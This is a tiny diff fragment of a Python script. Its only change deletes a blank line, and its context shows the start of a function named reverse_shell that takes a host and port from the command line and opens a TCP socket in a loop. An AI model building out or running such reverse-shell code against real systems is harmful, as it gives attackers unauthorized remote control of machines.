@@ -11,7 +11,6 @@ else:
     HOST = sys.argv[1]
     PORT = int(sys.argv[2])
 
-
     def reverse_shell(ip, port):
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
